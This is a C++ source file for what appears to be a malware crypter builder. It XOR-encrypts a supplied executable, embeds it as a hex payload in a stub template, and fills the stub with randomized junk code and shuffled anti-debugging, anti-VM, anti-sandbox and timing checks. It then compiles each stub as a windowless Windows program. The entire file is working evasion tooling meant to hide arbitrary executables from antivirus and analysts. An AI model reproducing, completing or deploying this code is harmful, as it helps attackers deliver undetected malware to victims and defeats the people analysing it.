#include "randomized_stub.h"
#include <fstream>
#include <sstream>
#include <random>
#include <ctime>
#include <windows.h>
#include <vector>
#include <cstdio>

std::string RandomString(size_t len) {
    static const char abc[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    std::string s;
    std::random_device rd; std::mt19937 mt(rd());
    std::uniform_int_distribution<> dist(0, sizeof(abc)-2);
    for (size_t i=0; i<len; ++i) s += abc[dist(mt)];
    return s;
}

// --- JUNK CODE ---
std::string GenerateJunkCode(int lines) {
    std::string junk;
    for (int i = 0; i < lines; ++i) {
        junk += "volatile int junk" + std::to_string(i) + " = " + std::to_string(rand() % 1000000) + ";\n";
        if (i % 2 == 0) junk += "junk" + std::to_string(i) + " += " + std::to_string(rand()%200) + ";\n";
        if (i % 5 == 0) junk += "for(int k=0;k<" + std::to_string(rand()%10+1) + ";++k) junk" + std::to_string(i) + "+=k;\n";
        if (i % 3 == 0) junk += "SetLastError(" + std::to_string(rand()%1000) + ");\n";
    }
    return junk;
}

// --- ANTIDEBUG ---
std::string GenerateAntiDebugCode() {
    std::vector<std::string> checks;
    checks.push_back("if (IsDebuggerPresent()) return true;");
    checks.push_back(R"(
        __try { __asm int 3 } __except(EXCEPTION_EXECUTE_HANDLER) { }
    )");
    checks.push_back(R"(
        BOOL bDebugger = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebugger);
        if (bDebugger) return true;
    )");
    checks.push_back(R"(
        PEB* pPEB = (PEB*)__readfsdword(0x30);
        if (pPEB->BeingDebugged) return true;
    )");
    checks.push_back(R"(
        OutputDebugStringA("debug?");
        if (GetLastError() != 0) return true;
    )");
    checks.push_back(R"(
        DWORD t1 = GetTickCount(); for (volatile int i=0;i<100000;i++); DWORD t2 = GetTickCount();
        if ((t2-t1) < 1) return true;
    )");
    std::string code;
    int n = rand() % 2 + 2;
    std::shuffle(checks.begin(), checks.end(), std::mt19937{std::random_device{}()});
    for (int i=0; i<n; ++i) code += checks[i] + "\n";
    return code + "return false;";
}

// --- ANTIVM ---
std::string GenerateAntiVMCode() {
    std::vector<std::string> checks;
    checks.push_back(R"(
        char name[256] = {};
        DWORD sz=256;
        GetComputerNameA(name, &sz);
        if (strstr(name, "VBOX") || strstr(name, "VMWARE") || strstr(name,"QEMU")) return true;
    )");
    checks.push_back(R"(
        HKEY hKey;
        if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\VBoxGuest",0,KEY_READ,&hKey)==ERROR_SUCCESS) {RegCloseKey(hKey); return true;}
    )");
    checks.push_back(R"(
        // MAC address check
        // ... (простой вариант, можно реализовать через iphlpapi)
    )");
    std::string code;
    int n = rand() % 2 + 1;
    std::shuffle(checks.begin(), checks.end(), std::mt19937{std::random_device{}()});
    for (int i=0; i<n; ++i) code += checks[i] + "\n";
    return code + "return false;";
}

// --- ANTISANDBOX ---
std::string GenerateAntiSandboxCode() {
    std::vector<std::string> checks;
    checks.push_back(R"(
        // Если нет мыши — подозрение на sandbox
        if (GetSystemMetrics(SM_MOUSEPRESENT)==0) return true;
    )");
    checks.push_back(R"(
        // Sandboxie check
        if (GetModuleHandleA("SbieDll.dll")) return true;
    )");
    checks.push_back(R"(
        // Проверка на процессы типа cuckoomon
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = {sizeof(pe)};
            if (Process32First(snap, &pe)) {
                do {
                    if (strstr(pe.szExeFile, "cuckoo") || strstr(pe.szExeFile, "sandbox")) { CloseHandle(snap); return true; }
                } while(Process32Next(snap, &pe));
            }
            CloseHandle(snap);
        }
    )");
    std::string code;
    int n = rand() % 2 + 1;
    std::shuffle(checks.begin(), checks.end(), std::mt19937{std::random_device{}()});
    for (int i=0; i<n; ++i) code += checks[i] + "\n";
    return code + "return false;";
}

// --- ANTITIMING ---
std::string GenerateAntiTimingCode() {
    return R"(
        LARGE_INTEGER f1,f2,ft; QueryPerformanceFrequency(&ft);
        QueryPerformanceCounter(&f1);
        for (volatile int i=0; i<1000000; i++);
        QueryPerformanceCounter(&f2);
        if ((f2.QuadPart - f1.QuadPart) < ft.QuadPart/1000) return true;
        return false;
    )";
}

// --- PAYLOAD HEX ---
std::string BytesToHexArray(const std::vector<uint8_t>& data) {
    std::ostringstream oss;
    for (size_t i=0; i<data.size(); ++i) {
        oss << "0x" << std::hex << (int)data[i];
        if (i+1 != data.size()) oss << ",";
    }
    return oss.str();
}

bool GenerateRandomizedStub(const std::vector<uint8_t>& exe, std::vector<uint8_t>& outStub) {
    std::ifstream in("stub_template.cpp");
    if (!in) return false;
    std::stringstream ss; ss << in.rdbuf();
    std::string code = ss.str();

    std::string key = RandomString(16);
    int method = (int)(std::time(nullptr)) % 2;
    std::string randstr = RandomString(10);
    uint32_t buildTime = (uint32_t)std::time(nullptr);

    std::vector<uint8_t> payload = exe;
    for (size_t i=0; i<payload.size(); ++i)
        payload[i] ^= key[i % key.size()];

    // Подставляем JUNK1..JUNK6
    for (int j=1;j<=6;++j) {
        std::string marker = "/*JUNK" + std::to_string(j) + "*/";
        std::string val = GenerateJunkCode(5 + rand()%5);
        size_t pos; while((pos=code.find(marker))!=std::string::npos) code.replace(pos, marker.size(), val);
    }
    // Подставляем анти-анализ
    size_t pos;
    while ((pos = code.find("//ANTIDEBUG")) != std::string::npos) code.replace(pos, 12, GenerateAntiDebugCode());
    while ((pos = code.find("//ANTIVM")) != std::string::npos) code.replace(pos, 9, GenerateAntiVMCode());
    while ((pos = code.find("//ANTISANDBOX")) != std::string::npos) code.replace(pos, 15, GenerateAntiSandboxCode());
    while ((pos = code.find("//ANTITIMING")) != std::string::npos) code.replace(pos, 13, GenerateAntiTimingCode());
    // Остальные маркеры
    while ((pos = code.find("/*KEY*/")) != std::string::npos) code.replace(pos, 8, key);
    while ((pos = code.find("/*METHOD*/")) != std::string::npos) code.replace(pos, 11, std::to_string(method));
    while ((pos = code.find("/*RANDSTR*/")) != std::string::npos) code.replace(pos, 12, randstr);
    while ((pos = code.find("/*BUILDTIME*/")) != std::string::npos) code.replace(pos, 13, std::to_string(buildTime));
    while ((pos = code.find("/*PAYLOAD*/")) != std::string::npos) code.replace(pos, 11, BytesToHexArray(payload));

    // Сохраняем временный .cpp, компилируем и очищаем
    const char* build_cpp = "stub_build.cpp";
    const char* build_exe = "stub_build.exe";
    std::ofstream out(build_cpp); out << code; out.close();
    std::string cmd = "g++ -std=c++17 -O2 -mwindows ";
    cmd += build_cpp; cmd += " -o "; cmd += build_exe;
    int ok = system(cmd.c_str());
    if (ok != 0) { std::remove(build_cpp); std::remove(build_exe); return false; }
    std::ifstream in2(build_exe, std::ios::binary);
    outStub.assign(std::istreambuf_iterator<char>(in2), std::istreambuf_iterator<char>());
    std::remove(build_cpp); std::remove(build_exe);
    return !outStub.empty();
}